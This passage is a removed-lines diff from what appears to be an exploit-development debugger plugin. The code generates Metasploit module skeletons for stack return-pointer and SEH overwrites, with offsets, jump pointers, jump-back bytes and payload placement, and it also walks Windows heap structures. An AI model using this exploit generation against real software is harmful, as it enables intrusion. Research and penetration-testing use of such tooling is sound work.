-                        shellcodesizeSEH = mspresults["seh"][seh][3]
-                        
-            if isSEH:
-                ignoremodules = True
-                noheader = True
-                exploitfilename_seh="exploit_seh.rb"
-                objexploitfile_seh = MnLog(exploitfilename_seh)
-                exploitfile_seh = objexploitfile_seh.reset()                
-                ignoremodules = False
-                noheader = False
-
-            # start building exploit structure
-            
-            if not isEIP and not isSEH:
-                dbg.log(" ** Unable to suggest anything useful. You don't seem to control EIP or SEH ** ",highlight=1)
-                return
-
-            # ask for type of module
-            if not usecliargs:
-                dbg.log(" ** Please select a skeleton exploit type from the dropdown list **",highlight=1)
-                exploittype = dbg.comboBox("Select msf exploit skeleton to build :", exploittypes).lower().strip()
-
-            if not exploittype in exploittypes:
-                dbg.log("Boo - invalid exploit type, try again !",highlight=1)
-                return
-
-
-            portnr = 0
-            extension = ""
-            if exploittype.find("network") > -1:
-                if usecliargs:
-                    portnr = skeletonarg
-                else:
-                    portnr = dbg.inputBox("Remote port number : ")
-                try:
-                    portnr = int(portnr)
-                except:
-                    portnr = 0
-
-            if exploittype.find("fileformat") > -1:
-                if usecliargs:
-                    extension = skeletonarg
-                else:
-                    extension = dbg.inputBox("File extension :")
-            
-            extension = extension.replace("'","").replace('"',"").replace("\n","").replace("\r","")
-            
-            if not extension.startswith("."):
-                extension = "." + extension 
-                
-                
-            dbg.createLogWindow()
-            dbg.updateLog()
-            url = ""
-            
-            badchars = ""
-            if "badchars" in criteria:
-                badchars = criteria["badchars"]
-                
-            if "nonull" in criteria:
-                if not '\x00' in badchars:
-                    badchars += '\x00'
-            
-            skeletonheader,skeletoninit,skeletoninit2 = getSkeletonHeader(exploittype,portnr,extension,url,badchars)
-            
-            regsto = ""         
-
-            if isEIP:
-                dbg.log("[+] Attempting to create payload for saved return pointer overwrite...")
-                #where can we jump to - get the register that has the largest buffer size
-                largestreg = ""
-                largestsize = 0
-                offsetreg = 0
-                regptr = 0
-                # register_to
-                # 0 : pointer
-                # 1 : offset
-                # 2 : size
-                # 3 : type
-                eipcriteria = criteria
-                modulecriteria["aslr"] = False
-                modulecriteria["rebase"] = False
-                modulecriteria["os"] = False
-                jmp_pointers = {}
-                jmppointer = 0
-                instrinfo = ""
-
-                if isEIPUnicode:
-                    eipcriteria["unicode"] = True
-                    eipcriteria["nonull"] = False
-                    
-                if "registers_to" in mspresults:
-                    for reg in mspresults["registers_to"]:
-                        regsto += reg+","
-                        thissize = mspresults["registers_to"][reg][2]
-                        thisreg = reg
-                        thisoffset = mspresults["registers_to"][reg][1]
-                        thisregptr = mspresults["registers_to"][reg][0]
-                        if thisoffset < initialoffsetEIP:
-                            #fix the size, which will end at offset to EIP
-                            thissize = initialoffsetEIP - thisoffset
-                        if thissize > largestsize:                              
-                            # can we find a jmp to that reg ?
-                            silent = True
-                            ptr_counter = 0
-                            ptr_to_get = 1                              
-                            jmp_pointers = findJMP(modulecriteria,eipcriteria,reg.lower())
-                            if len( jmp_pointers ) == 0:
-                                ptr_counter = 0
-                                ptr_to_get = 1                              
-                                modulecriteria["os"] = True
-                                jmp_pointers = findJMP(modulecriteria,eipcriteria,reg.lower())
-                            modulecriteria["os"] = False
-                            if len( jmp_pointers ) > 0:
-                                largestsize = thissize 
-                                largestreg = thisreg
-                                offsetreg = thisoffset
-                                regptr = thisregptr
-                            silent = False
-                regsto = regsto.rstrip(",")
-                
-                
-                if largestreg == "":
-                    dbg.log("    Payload is referenced by at least one register (%s), but I couldn't seem to find" % regsto,highlight=1)
-                    dbg.log("    a way to jump to that register",highlight=1)
-                else:
-                    #build exploit
-                    for ptrtype in jmp_pointers:
-                        jmppointer = jmp_pointers[ptrtype][0]
-                        instrinfo = ptrtype
-                        break
-                    ptrx = MnPointer(jmppointer)
-                    modname = ptrx.belongsTo()
-                    targetstr = "      'Targets'    =>\n"
-                    targetstr += "        [\n"
-                    targetstr += "          [ '<fill in the OS/app version here>',\n"
-                    targetstr += "            {\n"
-                    if not isEIPUnicode:
-                        targetstr += "              'Ret'     =>  0x" + toHex(jmppointer) + ", # " + instrinfo + " - " + modname + "\n"
-                        targetstr += "              'Offset'  =>  " + str(initialoffsetEIP) + "\n"
-                    else:
-                        origptr = toHex(jmppointer)
-                        #real unicode ?
-                        unicodeptr = ""
-                        transforminfo = ""
-                        if origptr[0] == "0" and origptr[1] == "0" and origptr[4] == "0" and origptr[5] == "0":                 
-                            unicodeptr = "\"\\x" + origptr[6] + origptr[7] + "\\x" + origptr[2] + origptr[3] + "\""
-                        else:
-                            #transform
-                            transform = UnicodeTransformInfo(origptr)
-                            transformparts = transform.split(",")
-                            transformsubparts = transformparts[0].split(" ")
-                            origptr = transformsubparts[len(transformsubparts)-1]
-                            transforminfo = " #unicode transformed to 0x" + toHex(jmppointer)
-                            unicodeptr = "\"\\x" + origptr[6] + origptr[7] + "\\x" + origptr[2] + origptr[3] + "\""
-                        targetstr += "              'Ret'     =>  " + unicodeptr + "," + transforminfo + "# " + instrinfo + " - " + modname + "\n"
-                        targetstr += "              'Offset'  =>  " + str(initialoffsetEIP) + "  #Unicode\n"    
-                    
-                    targetstr += "            }\n"
-                    targetstr += "          ],\n"
-                    targetstr += "        ],\n"
-
-                    exploitstr = "  def exploit\n\n"
-                    if exploittype.find("network") > -1:
-                        if exploittype.find("tcp") > -1:
-                            exploitstr += "\n    connect\n\n"
-                        elif exploittype.find("udp") > -1:
-                            exploitstr += "\n    connect_udp\n\n"
-                    
-                    if initialoffsetEIP < offsetreg:
-                        # eip is before shellcode
-                        exploitstr += "    buffer =  rand_text(target['Offset'])  \n"
-                        if not isEIPUnicode:
-                            exploitstr += "    buffer << [target.ret].pack('V')  \n"
-                        else:
-                            exploitstr += "    buffer << target['Ret']  #Unicode friendly jump\n\n"
-                        if offsetreg > initialoffsetEIP+2:
-                            if not isEIPUnicode:
-                                if (offsetreg - initialoffsetEIP - 4) > 0:
-                                    exploitstr += "    buffer << rand_text(" + str(offsetreg - initialoffsetEIP - 4) + ")  #junk\n"
-                            else:
-                                if ((offsetreg - initialoffsetEIP - 4)/2) > 0:
-                                    exploitstr += "    buffer << rand_text(" + str((offsetreg - initialoffsetEIP - 4)/2) + ")  #unicode junk\n"
-                        stackadjust = 0
-                        if largestreg.upper() == "ESP":
-                            if not isEIPUnicode:
-                                exploitstr += "    buffer << Metasm::Shellcode.assemble(Metasm::Ia32.new, 'add esp,-1500').encode_string # avoid GetPC shellcode corruption\n"
-                                stackadjust = 6
-                                exploitstr += "    buffer << payload.encoded  #max " + str(largestsize - stackadjust) + " bytes\n"
-                        if isEIPUnicode:
-                            exploitstr += "    # Metasploit requires double encoding for unicode : Use alpha_xxxx encoder in the payload section\n"
-                            exploitstr += "    # and then manually encode with unicode inside the exploit section :\n\n"
-                            exploitstr += "    enc = framework.encoders.create('x86/unicode_mixed')\n\n"
-                            exploitstr += "    register_to_align_to = '" + largestreg.upper() + "'\n\n"
-                            if largestreg.upper() == "ESP":
-                                exploitstr += "    # Note : since you are using ESP as bufferregister, make sure EBP points to a writeable address !\n"
-                                exploitstr += "    # or patch the unicode decoder yourself\n"
-                            exploitstr += "    enc.datastore.import_options_from_hash({ 'BufferRegister' => register_to_align_to })\n\n"
-                            exploitstr += "    unicodepayload = enc.encode(payload.encoded, nil, nil, platform)\n\n"
-                            exploitstr += "    buffer << unicodepayload"
-                                
-                    else:
-                        # EIP -> jump to location before EIP
-                        beforeEIP = initialoffsetEIP - offsetreg
-                        if beforeEIP > 0:
-                            if offsetreg > 0:
-                                exploitstr += "    buffer = rand_text(" + str(offsetreg)+")  #offset to " + largestreg+"\n"
-                                exploitstr += "    buffer << payload.encoded  #max " + str(initialoffsetEIP - offsetreg) + " bytes\n"
-                                exploitstr += "    buffer << rand_text(target['Offset'] - payload.encoded.length)\n"
-                                exploitstr += "    buffer << [target.ret].pack('V')  \n"
-                            else:
-                                exploitstr += "    buffer = payload.encoded  #max " + str(initialoffsetEIP - offsetreg) + " bytes\n"
-                                exploitstr += "    buffer << rand_text(target['Offset'] - payload.encoded.length)\n"
-                                exploitstr += "    buffer << [target.ret].pack('V')  \n"
-
-                    if exploittype.find("network") > -1:
-                        exploitstr += "\n    print_status(\"Trying target #{target.name}...\")\n"
-                        if exploittype.find("tcp") > -1:
-                            exploitstr += "    sock.put(buffer)\n"
-                            exploitstr += "\n    handler\n"
-                        elif exploittype.find("udp") > -1:
-                            exploitstr += "    udp_sock.put(buffer)\n"
-                            exploitstr += "\n    handler(udp_sock)\n"
-                    if exploittype == "fileformat":
-                        exploitstr += "\n    file_create(buffer)\n\n"
-                    
-                    if exploittype.find("network") > -1:
-                        exploitstr += "    disconnect\n\n"
-                    exploitstr += "  end\n"                 
-                    dbg.log("Metasploit 'Targets' section :")
-                    dbg.log("------------------------------")
-                    dbg.logLines(targetstr.replace("  ","    "))
-                    dbg.log("")
-                    dbg.log("Metasploit 'exploit' function :")
-                    dbg.log("--------------------------------")
-                    dbg.logLines(exploitstr.replace("  ","    "))
-                    
-                    #write skeleton
-                    objexploitfile.write(skeletonheader+"\n",exploitfile)
-                    objexploitfile.write(skeletoninit+"\n",exploitfile)
-                    objexploitfile.write(targetstr,exploitfile)
-                    objexploitfile.write(skeletoninit2,exploitfile)     
-                    objexploitfile.write(exploitstr,exploitfile)
-                    objexploitfile.write("end",exploitfile)                 
-                    
-            
-            if isSEH:
-                dbg.log("[+] Attempting to create payload for SEH record overwrite...")
-                sehcriteria = criteria
-                modulecriteria["safeseh"] = False
-                modulecriteria["rebase"] = False
-                modulecriteria["aslr"] = False
-                modulecriteria["os"] = False
-                sehptr = 0
-                instrinfo = ""
-                if isSEHUnicode:
-                    sehcriteria["unicode"] = True
-                    if "nonull" in sehcriteria:
-                        sehcriteria.pop("nonull")
-                modulecriteria["safeseh"] = False
-                #get SEH pointers
-                silent = True
-                ptr_counter = 0
-                ptr_to_get = 1                  
-                seh_pointers = findSEH(modulecriteria,sehcriteria)
-                jmpback = False
-                silent = False
-                if not isSEHUnicode:
-                    #did we find a pointer ?
-                    if len(seh_pointers) == 0:
-                        #did we try to avoid nulls ?
-                        dbg.log("[+] No non-null pointers found, trying 'jump back' layout now...")
-                        if "nonull" in sehcriteria:
-                            if sehcriteria["nonull"] == True:
-                                sehcriteria.pop("nonull")
-                                silent = True
-                                ptr_counter = 0
-                                ptr_to_get = 1                                  
-                                seh_pointers = findSEH(modulecriteria,sehcriteria)
-                                silent = False
-                                jmpback = True
-                    if len(seh_pointers) != 0:
-                        for ptrtypes in seh_pointers:
-                            sehptr = seh_pointers[ptrtypes][0]
-                            instrinfo = ptrtypes
-                            break
-                else:
-                    if len(seh_pointers) == 0:
-                        sehptr = 0
-                    else:
-                        for ptrtypes in seh_pointers:
-                            sehptr = seh_pointers[ptrtypes][0]
-                            instrinfo = ptrtypes
-                            break
-                        
-                if sehptr != 0:
-                    ptrx = MnPointer(sehptr)
-                    modname = ptrx.belongsTo()
-                    mixin = ""
-                    if not jmpback:
-                        mixin += "#Don't forget to include the SEH mixin !\n"
-                        mixin += "include Msf::Exploit::Seh\n\n"
-                        skeletonheader += "  include Msf::Exploit::Seh\n"
-
-                    targetstr = "      'Targets'    =>\n"
-                    targetstr += "        [\n"
-                    targetstr += "          [ '<fill in the OS/app version here>',\n"
-                    targetstr += "            {\n"
-                    if not isSEHUnicode:
-                        targetstr += "              'Ret'     =>  0x" + toHex(sehptr) + ", # " + instrinfo + " - " + modname + "\n"
-                        targetstr += "              'Offset'  =>  " + str(initialoffsetSEH) + "\n"                          
-                    else:
-                        origptr = toHex(sehptr)
-                        #real unicode ?
-                        unicodeptr = ""
-                        transforminfo = ""
-                        if origptr[0] == "0" and origptr[1] == "0" and origptr[4] == "0" and origptr[5] == "0":                 
-                            unicodeptr = "\"\\x" + origptr[6] + origptr[7] + "\\x" + origptr[2] + origptr[3] + "\""
-                        else:
-                            #transform
-                            transform = UnicodeTransformInfo(origptr)
-                            transformparts = transform.split(",")
-                            transformsubparts = transformparts[0].split(" ")
-                            origptr = transformsubparts[len(transformsubparts)-1]
-                            transforminfo = " #unicode transformed to 0x" + toHex(sehptr)
-                            unicodeptr = "\"\\x" + origptr[6] + origptr[7] + "\\x" + origptr[2] + origptr[3] + "\""
-                        targetstr += "              'Ret'     =>  " + unicodeptr + "," + transforminfo + " # " + instrinfo + " - " + modname + "\n"
-                        targetstr += "              'Offset'  =>  " + str(initialoffsetSEH) + "  #Unicode\n"                        
-                    targetstr += "            }\n"
-                    targetstr += "          ],\n"
-                    targetstr += "        ],\n"
-
-                    exploitstr = "  def exploit\n\n"
-                    if exploittype.find("network") > -1:
-                        exploitstr += "\n    connect\n\n"
-                    
-                    if not isSEHUnicode:
-                        if not jmpback:
-                            exploitstr += "    buffer = rand_text(target['Offset'])  #junk\n"
-                            exploitstr += "    buffer << generate_seh_record(target.ret)\n"
-                            exploitstr += "    buffer << payload.encoded  #" + str(shellcodesizeSEH) +" bytes of space\n"
-                            exploitstr += "    # more junk may be needed to trigger the exception\n"
-                        else:
-                            exploitstr += "    jmp_back = Rex::Arch::X86.jmp_short(-payload.encoded.length-5)\n\n"
-                            exploitstr += "    buffer = rand_text(target['Offset'] - payload.encoded.length - jmp_back.length)  #junk\n"
-                            exploitstr += "    buffer << payload.encoded\n"
-                            exploitstr += "    buffer << jmp_back  #jump back to start of payload.encoded\n"
-                            exploitstr += "    buffer << '\\xeb\\xf9\\x41\\x41'  #nseh, jump back to jmp_back\n"
-                            exploitstr += "    buffer << [target.ret].pack('V')  #seh\n"
-                    else:
-                        exploitstr += "    nseh = <insert 2 bytes that will acts as nseh walkover>\n"
-                        exploitstr += "    align = <insert routine to align a register to begin of payload and jump to it>\n\n"
-                        exploitstr += "    padding = <insert bytes to fill space between alignment code and payload>\n\n"
-                        exploitstr += "    # Metasploit requires double encoding for unicode : Use alpha_xxxx encoder in the payload section\n"
-                        exploitstr += "    # and then manually encode with unicode inside the exploit section :\n\n"
-                        exploitstr += "    enc = framework.encoders.create('x86/unicode_mixed')\n\n"
-                        exploitstr += "    register_to_align_to = <fill in the register name you will align to>\n\n"
-                        exploitstr += "    enc.datastore.import_options_from_hash({ 'BufferRegister' => register_to_align_to })\n\n"
-                        exploitstr += "    unicodepayload = enc.encode(payload.encoded, nil, nil, platform)\n\n"
-                        exploitstr += "    buffer = rand_text(target['Offset'])  #unicode junk\n"
-                        exploitstr += "    buffer << nseh  #Unicode walkover friendly dword\n"
-                        exploitstr += "    buffer << target['Ret']  #Unicode friendly p/p/r\n"
-                        exploitstr += "    buffer << align\n"
-                        exploitstr += "    buffer << padding\n"
-                        exploitstr += "    buffer << unicodepayload\n"
-                        
-                    if exploittype.find("network") > -1:
-                        exploitstr += "\n    print_status(\"Trying target #{target.name}...\")\n"                   
-                        exploitstr += "    sock.put(buffer)\n\n"
-                        exploitstr += "    handler\n"
-                    if exploittype == "fileformat":
-                        exploitstr += "\n    file_create(buffer)\n\n"                       
-                    if exploittype.find("network") > -1:
-                        exploitstr += "    disconnect\n\n"                      
-                        
-                    exploitstr += "  end\n"
-                    if mixin != "":
-                        dbg.log("Metasploit 'include' section :")
-                        dbg.log("------------------------------")
-                        dbg.logLines(mixin)
-                    dbg.log("Metasploit 'Targets' section :")
-                    dbg.log("------------------------------")
-                    dbg.logLines(targetstr.replace("  ","    "))
-                    dbg.log("")
-                    dbg.log("Metasploit 'exploit' function :")
-                    dbg.log("--------------------------------")
-                    dbg.logLines(exploitstr.replace("  ","    "))
-                    
-                    
-                    #write skeleton
-                    objexploitfile_seh.write(skeletonheader+"\n",exploitfile_seh)
-                    objexploitfile_seh.write(skeletoninit+"\n",exploitfile_seh)
-                    objexploitfile_seh.write(targetstr,exploitfile_seh)
-                    objexploitfile_seh.write(skeletoninit2,exploitfile_seh)     
-                    objexploitfile_seh.write(exploitstr,exploitfile_seh)
-                    objexploitfile_seh.write("end",exploitfile_seh)                 
-                    
-                else:
-                    dbg.log("    Unable to suggest a buffer layout because I couldn't find any good pointers",highlight=1)
-            
-            return  
-
-        #-----stacks-----#
-        def procStacks(args):
-            stacks = getStacks()
-            if len(stacks) > 0:
-                dbg.log("Stacks :")
-                dbg.log("--------")
-                for threadid in stacks:
-                    dbg.log("Thread %s : Stack : 0x%s - 0x%s (size : 0x%s)" % (str(threadid),toHex(stacks[threadid][0]),toHex(stacks[threadid][1]),toHex(stacks[threadid][1]-stacks[threadid][0])))
-            else:
-                dbg.log("No threads/stacks found !",highlight=1)
-            return
-
-        #------heapstuff-----#
-            
-        def procHeap(args):
-        
-            os = dbg.getOsVersion()
-            heapkey = 0
-
-            #first, print list of heaps
-            allheaps = []
-            try:
-                allheaps = dbg.getHeapsAddress()
-            except:
-                allheaps = []
-            dbg.log("Peb : 0x%08x, NtGlobalFlag : 0x%08x" % (dbg.getPEBAddress(),getNtGlobalFlag()))
-            dbg.log("Heaps:")
-            dbg.log("------")
-            if len(allheaps) > 0:
-                for heap in allheaps:
-                    segments = getSegmentList(heap)
-                    segmentlist = []
-                    for segment in segments:
-                        segmentlist.append(segment)
-                    if not win7mode:
-                        segmentlist.sort()
-                    segmentinfo = ""
-                    for segment in segmentlist:
-                        segmentinfo = segmentinfo + "0x%08x" % segment + ","
-                    segmentinfo = segmentinfo.strip(",")
-                    segmentinfo = " : " + segmentinfo
-                    defheap = ""
-                    lfhheap = ""
-                    keyinfo = ""
-                    if heap == getDefaultProcessHeap():
-                        defheap = "* Default process heap"
-                    if win7mode:
-                        iHeap = MnHeap(heap)
-                        if iHeap.usesLFH():
-                            lfhheapaddress = iHeap.getLFHAddress()
-                            lfhheap = "[LFH enabled, _LFH_HEAP at 0x%08x]" % lfhheapaddress
-                        if iHeap.getEncodingKey() > 0:
-                            keyinfo = "Encoding key: 0x%08x" % iHeap.getEncodingKey()
-                    dbg.log("0x%08x (%d segment(s)%s) %s %s %s" % (heap,len(segments),segmentinfo,defheap,lfhheap,keyinfo))
-            else:
-                dbg.log(" ** No heaps found")
-            dbg.log("")
-
-            heapbase = 0
-            searchtype = ""
-            searchtypes = ["lal","lfh","all","segments", "chunks", "layout", "fea", "bea"]
-            error = False
-            filterafter = ""
-            
-            showdata = False
-            findvtablesize = True
-            expand = False
-
-            minstringlength = 32
-            
-            if len(allheaps) > 0:
-                if "h" in args and type(args["h"]).__name__.lower() != "bool":
-                    hbase = args["h"].replace("0x","").replace("0X","")
-                    if not (isAddress(hbase) or hbase.lower() == "default"):
-                        dbg.log("%s is an invalid address" % args["h"], highlight=1)
-                        return
-                    else:
-                        if hbase.lower() == "default":
-                            heapbase = getDefaultProcessHeap()
-                        else:
-                            heapbase = hexStrToInt(hbase)
-            
-                if "t" in args:
-                    if type(args["t"]).__name__.lower() != "bool":
-                        searchtype = args["t"].lower().replace('"','').replace("'","")
-                        if searchtype == "blocks":
-                            dbg.log("** Note : type 'blocks' has been replaced with 'chunks'",highlight=1)
-                            dbg.log("")
-                            searchtype = "chunks"
-                        if not searchtype in searchtypes:
-                            searchtype = ""
-                    else:
-                        searchtype = ""
-
-                if "after" in args:
-                    if type(args["after"]).__name__.lower() != "bool":
-                        filterafter = args["after"].replace('"','').replace("'","")
-                        
-                if "v" in args:
-                    showdata = True
-                    
-                if "expand" in args:
-                    expand = True
-                    
-                if "fast" in args:
-                    findvtablesize = False 
-                    showdata = False
-                
-                if searchtype == "" and not "stat" in args:
-                    dbg.log("Please specify a valid searchtype -t",highlight=1)
-                    dbg.log("Valid values are :",highlight=1)
-                    for val in searchtypes:
-                        if val != "blocks": 
-                            dbg.log("   %s" % val,highlight=1)
-                    error = True
-
-                if "h" in args and heapbase == 0:
-                    dbg.log("Please specify a valid heap base address -h",highlight=1)
-                    error = True
-
-                if "size" in args:
-                    if type(args["size"]).__name__.lower() != "bool":
-                        size = args["size"].lower()
-                        if size.startswith("0x"):
-                            minstringlength = hexStrToInt(size)
-                        else:
-                            minstringlength = int(size)
-                    else:
-                        dbg.log("Please provide a valid size -size",highlight=1)
-                        error = True
-
-                if "clearcache" in args:
-                    dbg.forgetKnowledge("vtableCache")
-                    dbg.log("[+] vtableCache cleared.")
-            
-            else:
-                dbg.log("No heaps found",highlight=1)
-                return
-            
-            heap_to_query = []
-            heapfound = False
-            
-            if "h" in args:
-                for heap in allheaps:
-                    if heapbase == heap:
-                        heapfound = True
-                        heap_to_query = [heapbase]
-                if not heapfound:
-                    error = True
-                    dbg.log("0x%08x is not a valid heap base address" % heapbase,highlight=1)
-            else:
-                #show all heaps
-                for heap in allheaps:
-                    heap_to_query.append(heap)
-            
-            if error:
-                return
-            else:
-                statinfo = {}
-                logfile_b = ""
-                thislog_b = ""
-                logfile_l = ""
-                logfile_l = ""
-
-                if searchtype == "chunks" or searchtype == "all":
-                    logfile_b = MnLog("heapchunks.txt")
-                    thislog_b = logfile_b.reset()
-
-                if searchtype == "layout" or searchtype == "all":
-                    logfile_l = MnLog("heaplayout.txt")
-                    thislog_l = logfile_l.reset()
-
-                for heapbase in heap_to_query:
-                    mHeap = MnHeap(heapbase)
-                    heapbase_extra = ""
-                    frontendinfo = []
-                    frontendheapptr = 0
-                    frontendheaptype = 0
-                    if win7mode:
-                        heapkey = mHeap.getEncodingKey()
-                        if mHeap.usesLFH():
-                            frontendheaptype = 0x2
-                            heapbase_extra = " [LFH] "
-                            frontendheapptr = mHeap.getLFHAddress()
-                    frontendinfo = [frontendheaptype,frontendheapptr]
-                        
-                    dbg.log("")
-                    dbg.log("[+] Processing heap 0x%08x%s" % (heapbase,heapbase_extra))
-
-                    if searchtype == "fea":
-                        if win7mode:
-                            searchtype = "lfh"
-                        else:
-                            searchtype = "lal"
-                    if searchtype == "bea":
-                            searchtype = "freelist"
-
-                    # LookAsideList
-                    if searchtype == "lal" or (searchtype == "all" and not win7mode):
-                        lalindex = 0
-                        if win7mode:
-                            dbg.log(" !! This version of the OS doesn't have a LookAside List !!")
-                        else:
-                            dbg.log("[+] FrontEnd Allocator : LookAsideList")
-                            dbg.log("[+] Getting LookAsideList for heap 0x%08x" % heapbase)
-                            # do we have a LAL for this heap ?
-                            FrontEndHeap = mHeap.getFrontEndHeap()
-                            if FrontEndHeap > 0:
-                                dbg.log("    FrontEndHeap: 0x%08x" % FrontEndHeap)
-                                fea_lal = mHeap.getLookAsideList()
-                                dbg.log("    Nr of (non-empty) LookAside Lists : %d" % len(fea_lal))
-                                dbg.log("")
-                                for lal_table_entry in sorted(fea_lal.keys()):
-                                    expectedsize = lal_table_entry * 8
-                                    nr_of_chunks = len(fea_lal[lal_table_entry])
-                                    lalhead = struct.unpack('<L',dbg.readMemory(FrontEndHeap + (0x30 * lal_table_entry),4))[0]
-                                    dbg.log("LAL [%d] @0x%08x, Expected Chunksize 0x%x (%d), Flink : 0x%08x" % (lal_table_entry,FrontEndHeap + (0x30 * lal_table_entry),expectedsize,expectedsize,lalhead))
-                                    mHeap.showLookAsideHead(lal_table_entry)
-                                    dbg.log("  %d chunks:" % nr_of_chunks)
-                                    for chunkindex in fea_lal[lal_table_entry]:
-                                        lalchunk = fea_lal[lal_table_entry][chunkindex]
-                                        chunksize = lalchunk.size * 8
-                                        flag = getHeapFlag(lalchunk.flag)
-                                        data = ""
-                                        if showdata:
-                                            data = bin2hex(dbg.readMemory(lalchunk.userptr,16))
-                                        dbg.log("     ChunkPtr: 0x%08x, UserPtr: 0x%08x, Flink: 0x%08x, ChunkSize: 0x%x, UserSize: 0x%x, Userspace: 0x%x (%s) %s" % (lalchunk.chunkptr, lalchunk.userptr,lalchunk.flink,chunksize,lalchunk.usersize,lalchunk.usersize+lalchunk.remaining,flag,data))
-                                        if chunksize != expectedsize:
-                                            dbg.log("               ^^ ** Warning - unexpected size value, header corrupted ? **",highlight=True)
-                                    dbg.log("")
-                            else:
-                                dbg.log("[+] No LookAsideList found for this heap")
-                                dbg.log("")
-
-                    if searchtype == "lfh" or (searchtype == "all" and win7mode):
-                        dbg.log("[+] FrontEnd Allocator : Low Fragmentation Heap")
-                        dbg.log("     ** Not implemented yet **")
-                        
-                    if searchtype == "freelist" or (searchtype == "all" and not win7mode):
-                        flindex = 0
-                        dbg.log("[+] BackEnd Allocator : FreeLists")
-                        dbg.log("[+] Getting FreeLists for heap 0x%08x" % heapbase)
-                        thisfreelist = mHeap.getFreeList()
-                        thisfreelistinusebitmap = mHeap.getFreeListInUseBitmap()
-                        bitmapstr = ""
-                        for bit in thisfreelistinusebitmap:
-                            bitmapstr += str(bit)
-                        dbg.log("[+] FreeListsInUseBitmap:")
-                        printDataArray(bitmapstr,32,prefix="    ")
-                        # make sure the freelist is printed in the correct order
-                        flindex = 0
-                        while flindex < 128:
-                            if flindex in thisfreelist:
-                                freelist_addy = heapbase + 0x178 + (8 * flindex)
-                                expectedsize = ">1016"
-                                expectedsize2 = ">0x%x" % 1016
-                                if flindex != 0:
-                                    expectedsize2 = str(8 * flindex)
-                                    expectedsize = "0x%x" % (8 * flindex)           
-                                dbg.log("[+] FreeList[%02d] at 0x%08x, Expected size: %s (%s)" % (flindex,freelist_addy,expectedsize,expectedsize2))
-                                flindicator = 0
-                                for flentry in thisfreelist[flindex]:
-                                    freelist_chunk = thisfreelist[flindex][flentry]
-                                    chunksize = freelist_chunk.size * 8
-                                    dbg.log("     ChunkPtr: 0x%08x, Header: 0x%x bytes, UserPtr: 0x%08x, Flink: 0x%08x, Blink: 0x%08x, ChunkSize: 0x%x (%d), Usersize: 0x%x (%d) " % (freelist_chunk.chunkptr, freelist_chunk.headersize, freelist_chunk.userptr,freelist_chunk.flink,freelist_chunk.blink,chunksize,chunksize,freelist_chunk.usersize,freelist_chunk.usersize))
-                                    if flindex != 0 and chunksize != (8*flindex):
-                                        dbg.log("     ** Header may be corrupted! **", highlight = True)
-                                    flindicator = 1
-                                if flindex > 1 and int(bitmapstr[flindex]) != flindicator:
-                                    dbg.log("     ** FreeListsInUseBitmap mismatch for index %d! **" % flindex, highlight = True)
-                            flindex += 1
-
-                    if searchtype == "layout" or searchtype == "all":
-                        segments = getSegmentsForHeap(heapbase)
-
-                        sortedsegments = []
-                        global vtableCache
-                        # read vtableCache from knowledge
-                        vtableCache = dbg.getKnowledge("vtableCache")
-                        if vtableCache is None:
-                            vtableCache = {}
-
-                        for seg in segments:
-                            sortedsegments.append(seg)
-                        if not win7mode:
-                            sortedsegments.sort()
-                        segmentcnt = 0
-                        minstringlen = minstringlength
-                        blockmem = []
-                        nr_filter_matches = 0
-
-                        vablocks = []
-                        # VirtualAllocdBlocks
-                        vachunks = mHeap.getVirtualAllocdBlocks()
-                        infoblocks = {}
-                        infoblocks["segments"] = sortedsegments
-                        if expand:
-                            infoblocks["virtualallocdblocks"] = [vachunks]
-
-                        for infotype in infoblocks:
-                            heapdata = infoblocks[infotype]
-                            for thisdata in heapdata:
-                                if infotype == "segments":
-                                    seg = thisdata
-                                    segmentcnt += 1
-                                    segstart = segments[seg][0]
-                                    segend = segments[seg][1]
-                                    FirstEntry = segments[seg][2]
-                                    LastValidEntry = segments[seg][3]                               
-                                    datablocks = walkSegment(FirstEntry,LastValidEntry,heapbase)
-                                    tolog = "----- Heap 0x%08x%s, Segment 0x%08x - 0x%08x (%d/%d) -----" % (heapbase,heapbase_extra,segstart,segend,segmentcnt,len(sortedsegments))
-
-                                if infotype == "virtualallocdblocks":
-                                    datablocks = heapdata[0]
-                                    tolog = "----- Heap 0x%08x%s, VirtualAllocdBlocks : %d" % (heapbase,heapbase_extra,len(datablocks))
-
-                                logfile_l.write(" ",thislog_l)                              
-                                dbg.log(tolog)
-                                logfile_l.write(tolog,thislog_l)
-
-                                sortedblocks = []
-                                for block in datablocks:
-                                    sortedblocks.append(block)
-                                sortedblocks.sort()                             
-
-                                # for each block, try to get info
-                                # object ?
-                                # BSTR ?
-                                # str ?
-                                for block in sortedblocks:
-                                    showinlog = False
-                                    thischunk = datablocks[block]
-                                    unused = thischunk.unused
-                                    headersize = thischunk.headersize
-                                    flags = getHeapFlag(thischunk.flag)
-                                    userptr = block + headersize
-                                    psize = thischunk.prevsize * 8
-                                    blocksize = thischunk.size * 8
-                                    selfsize = blocksize
-                                    usersize = selfsize - unused                
-                                    usersize = blocksize - unused
-                                    extratxt = ""   
-                                    if infotype == "virtualallocdblocks":
-                                        selfsize = thischunk.commitsize * 8
-                                        blocksize = selfsize
-                                        usersize = selfsize - unused
-                                        nextblock = thischunk.flink
-                                    # read block into memory
-                                    blockmem = dbg.readMemory(block,blocksize)
-
-                                    # first, find all strings (ascii, unicode and BSTR)
-                                    asciistrings = {}
-                                    unicodestrings = {}
-                                    bstr = {}
-                                    objects = {}
-                                    asciistrings = getAllStringOffsets(blockmem,minstringlen)
-
-                                    # determine remaining subsets of the original block
-                                    remaining = {}
-                                    curpos = 0
-                                    for stringpos in asciistrings:
-                                        if stringpos > curpos:
-                                            remaining[curpos] = stringpos - curpos
-                                            curpos = asciistrings[stringpos]
-                                    if curpos < blocksize:
-                                        remaining[curpos] = blocksize
-
-                                    # search for unicode in remaining subsets only - tx for the regex help Turboland !
-                                    for remstart in remaining:
-                                        remend = remaining[remstart]
-                                        thisunicodestrings = getAllUnicodeStringOffsets(blockmem[remstart:remend],minstringlen,remstart)
-                                        # append results to master list
-                                        for tus in thisunicodestrings:
-                                            unicodestrings[tus] = thisunicodestrings[tus]
-
-                                    # check each unicode, maybe it's a BSTR
-                                    tomove = []
-                                    for unicodeoffset in unicodestrings:
-                                        delta = unicodeoffset
-                                        size = (unicodestrings[unicodeoffset] - unicodeoffset)/2
-                                        if delta >= 4:
-                                            maybesize = struct.unpack('<L',blockmem[delta-3:delta+1])[0] # it's an offset, remember ?
-                                            if maybesize == (size*2):
-                                                tomove.append(unicodeoffset)
-                                                bstr[unicodeoffset] = unicodestrings[unicodeoffset]
